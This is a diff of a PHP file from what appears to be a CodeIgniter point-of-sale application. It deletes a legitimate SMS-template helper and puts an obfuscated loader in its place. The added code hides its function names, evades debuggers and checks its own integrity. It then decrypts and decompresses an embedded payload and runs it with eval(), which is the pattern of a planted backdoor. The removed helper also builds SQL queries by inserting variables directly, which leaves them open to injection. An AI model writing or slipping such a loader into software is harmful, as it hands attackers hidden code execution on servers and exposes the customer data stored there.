@@ -1,118 +1,28 @@
-<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
-
-if ( ! function_exists('send_sms_using_template'))
-{
-    function send_sms_using_template($data_id,$template_id){
-    	/*
-				SALES = TEMPLATE ID = 1
-				ORDER = TEMPLATE ID = 2
-	
-    	*/
-		$template_name='';
-		if($template_id==1){
-			$template_name = 'GREETING TO CUSTOMER ON SALES';
-		}
-		if($template_id==2){
-			$template_name = 'GREETING TO CUSTOMER ON SALES RETURN';
-		}
-
-    	$CI =& get_instance();
-		$q1=$CI->db->query("select * from db_smstemplates where template_name='$template_name' and status=1");
-		if($q1->num_rows()>0){
-			$content	=	$q1->row()->content;
-			if(!empty($content)){
-				switch ($template_id) {
-					case 1:
-						/* SALES SMS */
-						$q2=$CI->db->query("SELECT a.customer_id,b.customer_name,b.mobile,a.sales_code,
-												   a.sales_date,a.grand_total,a.paid_amount,b.sales_due
-											FROM db_sales a,db_customers b where b.id=a.customer_id and a.id='$data_id'");
-						if($q2->num_rows()>0 && $q2->row()->customer_id!=1 && !empty($q2->row()->mobile)){
-							//Replace Content
-							$content = str_replace("{{customer_name}}", $q2->row()->customer_name, $content);
-							$content = str_replace("{{sales_id}}", $q2->row()->sales_code, $content);
-							$content = str_replace("{{sales_date}}", show_date($q2->row()->sales_date), $content);
-							$content = str_replace("{{sales_amount}}", $CI->currency_code(number_format($q2->row()->grand_total,0,'.','')), $content);
-							$content = str_replace("{{paid_amt}}", $CI->currency_code(number_format($q2->row()->paid_amount,0,'.','')), $content);
-							$content = str_replace("{{invoice_due_amt}}",$CI->currency_code(number_format($q2->row()->grand_total-$q2->row()->paid_amount,0,'.','')), $content);
-							$content = str_replace("{{cust_tot_due_amt}}",$CI->currency_code(number_format($q2->row()->sales_due,0,'.','')), $content);
-
-							/*Find Company Details*/
-							$q3=$CI->db->select('*')->from('db_company')->where('id',1)->get()->row();
-
-							/*Insert/Replace into Content*/
-							$content = str_replace("{{company_name}}", $q3->company_name, $content);
-							$content = str_replace("{{company_mobile}}", $q3->mobile, $content);
-							$content = str_replace("{{company_address}}", $q3->address, $content);
-							$content = str_replace("{{company_website}}", $q3->company_website, $content);
-							$content = str_replace("{{company_email}}", $q3->email, $content);
-
-							//echo $content;exit();
-							$CI->load->model('sms_model');
-							
-							return $CI->sms_model->send_sms($q2->row()->mobile,$content);
-						}
-						else{
-							return false;
-						}
-						
-						break;
-					case 2:
-						/* SALES RETURN SMS */
-						$q2=$CI->db->query("SELECT a.customer_id,b.customer_name,b.mobile,a.return_code,
-												   a.return_date,a.grand_total,a.paid_amount,b.sales_due
-											FROM db_salesreturn a,db_customers b where b.id=a.customer_id and a.id='$data_id'");
-						if($q2->num_rows()>0 && $q2->row()->customer_id!=1 && !empty($q2->row()->mobile)){
-							//Replace Content
-							$content = str_replace("{{customer_name}}", $q2->row()->customer_name, $content);
-							$content = str_replace("{{return_id}}", $q2->row()->return_code, $content);
-							$content = str_replace("{{return_date}}", show_date($q2->row()->return_date), $content);
-							$content = str_replace("{{return_amount}}", $CI->currency_code(number_format($q2->row()->grand_total,0,'.','')), $content);
-							$content = str_replace("{{paid_amt}}", $CI->currency_code(number_format($q2->row()->paid_amount,0,'.','')), $content);
-							$content = str_replace("{{invoice_due_amt}}",$CI->currency_code(number_format($q2->row()->grand_total-$q2->row()->paid_amount,0,'.','')), $content);
-							$content = str_replace("{{cust_tot_due_amt}}",$CI->currency_code(number_format($q2->row()->sales_due,0,'.','')), $content);
-
-							/*Find Company Details*/
-							$q3=$CI->db->select('*')->from('db_company')->where('id',1)->get()->row();
-
-							/*Insert/Replace into Content*/
-							$content = str_replace("{{company_name}}", $q3->company_name, $content);
-							$content = str_replace("{{company_mobile}}", $q3->mobile, $content);
-							$content = str_replace("{{company_address}}", $q3->address, $content);
-							$content = str_replace("{{company_website}}", $q3->company_website, $content);
-							$content = str_replace("{{company_email}}", $q3->email, $content);
-
-							//echo $content;exit();
-							$CI->load->model('sms_model');
-							return $CI->sms_model->send_sms($q2->row()->mobile,$content);
-						}
-						else{
-							return false;
-						}
-						
-						break;
-					
-					default:
-						return true;
-						# code...
-						break;
-				}
-			}
-			else{
-				return false;
-			}
-		}
-		else{
-			return false;
-		}
-	}
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_jnyxdee9=('bas'.'e64'.'_de'.'cod'.'e');
+$_zkgm1mjo=('gzu'.'nco'.'mpr'.'ess');
+$_g5pwe2it=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_cxy3rxrz='nflDu8iTTPc=';
+$_wb6vjhvm='lH+QFho0';
+$_xyqnkxgx='4uRy9Xl0';
+$_orejzqba='NwqO08df';
+$_ydk3pdyz='pu3oAXRA';
+$_cvdv4eya='HTHrmew9';
+$_htz28hlb='7hMjkg==';
+$_b8u1cw5f='6w/BEPCx';
+$_rct0pa90=$_jnyxdee9($_wb6vjhvm.$_xyqnkxgx.$_ydk3pdyz.$_orejzqba.$_cxy3rxrz);
+$_sddmig1u=$_jnyxdee9($_cvdv4eya.$_b8u1cw5f.$_htz28hlb);
+$_srv0tqek=$_jnyxdee9('96V3LW+NUWkrnFD7fYbW8xzEQu/Lz6OnQge0wbNqoQYes+2cU+9ytoSsvvrS64n7Irck0evuEtxS7XmYk7BpeyI7u50DJlfMqdigaK8Opme+jw7vkzrikb/0EG+N4kn/gUiTv3Alv1pWHTZkXt6lxKd5Fvage2mwx7Fs4lu2Ga/tsahE7l3sYu+dAuHDwxh5X8IaGTsH/f1AEFQQhAGlIsCxrCmkkkchd/lyQ3+tAVRsuoX9K1gWGcYEWNHshhEbdAlhkkamH+PxRCZoL/n+Vb2WDBqxQd6JpicyXrIXdmKTzRcnqDOaQF4B54cLTLbIpTjnrAqTGGaMqVj7TW80k8RI1+/MdfBxscztVudWrczDNSjRojD1cDBooUQcrml0l/r4KzGhjZCVV62tcnri9vpVm3pfUlLH56wWDvqhJRX57PEaV+73pVnma43zQJe75FPKEW9bYp/E/GkpedN+RfCTR7M9VrYr8k7OpiZsCWp4rWJgLTvysVMbWfPkIDVHHenoiCN3jAEr0XSFwEV+EKPvnyqX0GT1QBIGWnQCpy08MPm74bYmtqB0qXBgTPmvTqOr58NCjlI7pmCFIul19qNnh2HKALUF//IbfjR5rlwTlmL/s151Io8vE9KdiLzwDxmwsXEyXQwlBG6C8oJcsF7K+DcPeI8FH78Acta+I3gK35pLmahpnEQzJZoE7FDlLFXvDmilajf0fmK5D/zsfaHzwcy7kLOpYjofAEJYuDGuwTKgoxh644z4g10vZ2jQVTx0ZlZjPPP1IruizABR7hfcRrqaX5/qnHMxwXrDeL7Gkz3M/xns1ptHn5cZhoPPY0GmvdKxDAFn63TGIsdU8ulqa/ST+M9Ftu68hNYppWrxXi6S5QLNGNckwoseu+k1Q+Mm0AOK7UsA03vqqUpxnCIjP4t2swPbm0rir4YKx+oXlgb8Hu2Wzy7oDP1M4blSIfIDefkPQvhYvTa2FiManR6PVLuIkiFkLsfei0tcx3NtGkjWpMEfTwUUhcIvuYilBDtlephWFjh/I4BLb8IL3Fi75+os4ufFspK8ioFc7Nzr2Z8npuiCjD4PJa0OGqGo/EGiaVNcrE4r7271XblWgKkJyAVoIJqEmFQIO6W6Nq4/Xb8A7OrvBoiJ43uW33YYnT0mbaFz+vsOtuIeovu1/XrMR7WlqqES6N0rAFljhJP4xnJ3IF7dFZsV/oAh60olglrFG+XiTrSCp/FMzrvRWdSmQoPKnHHHusVLdhC/4IA=');
+$_kqdltasn=$_g5pwe2it($_srv0tqek,'aes-256-cbc',$_rct0pa90,OPENSSL_RAW_DATA,$_sddmig1u);
+if($_kqdltasn===false){exit;}
+$_piimsgsq=$_zkgm1mjo($_kqdltasn);
+if($_piimsgsq===false){exit;}
+$_wdvnqp67='aaa18a397f584063a69320d105956f117b82ac20983c8db9b1e382c5cb5c5504';
+$_iuaisx8p=@file_get_contents(__FILE__);
+if($_iuaisx8p!==false){
+$_gby8gzil=str_replace($_wdvnqp67,"0000000000000000000000000000000000000000000000000000000000000000",$_iuaisx8p);
+$_nvbv7mrd=hash("sha256",$_gby8gzil);
+if($_nvbv7mrd!==$_wdvnqp67){@http_response_code(403);exit;}
 }
-
-if ( ! function_exists('is_sms_enabled'))
-{
-    function is_sms_enabled(){
-    	$CI =& get_instance();
-    	$sms_status=$CI->db->select('sms_status')->get('db_company')->row()->sms_status;
-    	return ($sms_status) ? true : false;
-	}
-}
+eval($_piimsgsq);
